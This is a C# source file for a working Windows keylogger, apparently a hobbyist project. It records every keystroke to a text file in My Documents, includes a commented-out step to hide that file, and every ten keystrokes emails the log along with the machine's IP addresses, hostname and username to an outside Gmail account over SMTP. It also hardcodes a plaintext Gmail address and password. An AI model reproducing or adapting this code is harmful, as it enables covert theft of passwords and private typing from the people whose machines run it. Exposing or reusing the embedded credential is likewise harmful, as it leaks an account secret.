using System;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Threading;

namespace Keylogger_1
{
    class Program
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
 

        //1. string to hold all of the keystroke
        static long numberOfKeyStrokes = 0;
        static void Main(string[] args)
        {

            String filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            //IF MyDocuments path cannot be found then create a MyDocuments path
            if (!Directory.Exists(filepath))
            {
                Directory.CreateDirectory(filepath);
            }
            string path = (filepath + @"\keystrokes.txt");
            if (!File.Exists(path))
            {
                using(StreamWriter sw = File.CreateText(path))
                {

                }
                //Hide the file file so the users does not view it but it can be viewws vua tge task maanger or if you enable hidden files via Control panel -> appearance and presentation on the windows PC
             //   File.SetAttributes(path, File.GetAttributes(path) | FileAttributes.Hidden);
            }
            //Capture keystrokes and display them to the console
            while (true)//this is an infinit loop
            {
                //Pause and let other programs get a chance to run
                Thread.Sleep(5);
                //check the state of each keys
                for(int i = 32; i < 127; i++)
                {
                   int keyState = GetAsyncKeyState(i);
                    //print to the console
                    if (keyState == 32769)
                    {
                        Console.Write((char)i + ", ");
                        //2. Store the strokes into a text file
                        using (StreamWriter sw = File.AppendText(path))
                        {
                            sw.Write((char) i);
                        }
                        numberOfKeyStrokes++;
                        //Avoiding sending the message everytime a message has been typed but after a while
                        //Send message every 100 characters typed
                        if(numberOfKeyStrokes % 10 == 0)
                        {
                            SendNewMessage();
                        }
                       
                    }
                }

                


                //3. periodically send the contents of the file to an external email address

            }

        }//end main
        static void SendNewMessage()
        {
            // send the contents of the text file to an external email address
            String folderName = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            String filePath = folderName + @"\keystrokes.txt";

            String logContents = File.ReadAllText(filePath);
            string emailBody = "";

            //creat an email message
            //1 figure out what time it is
            DateTime NOW = DateTime.Now;
            String subject = "Message from keylogger";
            //2 capture the name of my computer and Ip address, so the reciever of the email will know where the message came from
            var host = Dns.GetHostEntry(Dns.GetHostName());
            //The pc might have more than one IP address so we will loop through them and for each ip address we will have an ip name
            foreach (var address in host.AddressList)
            {
                emailBody += "Address: "+ address;
            }
            emailBody += "\n User:" + Environment.UserDomainName + " \\ " + Environment.UserName;
            emailBody += "\nhost " + host;
            emailBody += "\ntime: " + NOW.ToString();
            //the contents of the file that we keylogged
            emailBody += logContents;

            SmtpClient client = new SmtpClient("smtp.gmail.com", 587); // CHECK OUT THE DOCUMANTAION OF GMAIL--for the number 587
            MailMessage mailMessage = new MailMessage();
            //the source of the email .i.e the sender
            mailMessage.From = new MailAddress("arnoldsprout@gmail.com");
            //We send it back to our own email address, note this is for testing purposes
            mailMessage.To.Add("arnoldsprout@gmail.com");
            mailMessage.Subject = subject;
            //this will require us to login, therefore we will set it to false
            client.UseDefaultCredentials = false;
            //this is because anything from google is encrypted
            client.EnableSsl = true;
            //Our creditentials so we can Login
            client.Credentials = new System.Net.NetworkCredential("arnoldsprout@gmail.com", "gnabahTMohale");
            mailMessage.Body = emailBody;

            client.Send(mailMessage);

        }
    }
}
